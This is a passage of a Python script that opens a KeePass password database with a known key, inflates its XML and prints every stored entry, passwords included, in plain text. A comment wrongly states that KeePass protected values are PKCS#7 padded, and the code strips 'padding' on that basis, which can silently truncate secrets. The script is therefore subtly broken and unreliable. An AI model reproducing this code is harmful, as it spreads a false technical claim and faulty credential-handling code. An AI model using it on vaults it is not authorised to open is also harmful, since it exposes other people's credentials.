pt = AES.new(key, AES.MODE_CBC, h["iv"]).decrypt(ct)

if pt[:32] != h["stream_start"]:
    print("\n[-] stream-start mismatch -> wrong password or damaged file")
    sys.exit(1)
print("\n[+] stream-start bytes match - password is correct")

# ---- the payload is a gzip member; locate and inflate it ------------------
i = pt.find(b"\x1f\x8b\x08", 32)
xml = zlib.decompress(pt[i:], 16 + zlib.MAX_WBITS)
open(DST, "wb").write(xml)
print(f"[+] gzip at plaintext offset {i} -> {len(xml)} bytes XML -> {DST}")

# ---- optional: decode Salsa20-protected values ---------------------------
def salsa_decrypt(xml_bytes, psk):
    from Crypto.Cipher import Salsa20
    key = hashlib.sha256(psk).digest()
    # KeePass fixed nonce; protected values are PKCS#7 padded before encryption
    box = Salsa20.new(key=key, nonce=b"\xE8\x30\x09\x4B\x97\x20\x5D\x2A")
    out = xml_bytes.decode("utf-8", "replace")
    import re
    res, pos = [], 0
    for m in re.finditer(r'<Value Protected="True">([^<]*)</Value>', out):
        res.append(out[pos:m.start()])
        enc = base64.b64decode(m.group(1) or "")
        raw = box.decrypt(enc)
        if raw and 0 < raw[-1] <= 32:          # strip PKCS#7 padding
            raw = raw[:-raw[-1]]
        res.append('<Value Protected="True">' + raw.decode("utf-8", "replace") + "</Value>")
        pos = m.end()
    res.append(out[pos:])
    return "".join(res)

# ---- print the vault -----------------------------------------------------
import xml.etree.ElementTree as ET

text = salsa_decrypt(xml, h["protected_stream_key"]) if b'Protected="True">' in xml else xml.decode()
root = ET.fromstring(text)
print()
for group in root.iter("Group"):
    gname = group.findtext("Name")
    for e in group.findall("Entry"):
        kv = {s.findtext("Key"): (s.findtext("Value") or "") for s in e.findall("String")}
        print(f"[{gname}] {kv.pop('Title', '(untitled)')}")
        for k, v in kv.items():
            v = v.strip()
            if v:
                print(f"    {k:16} {v[:120]}")
        print()
```
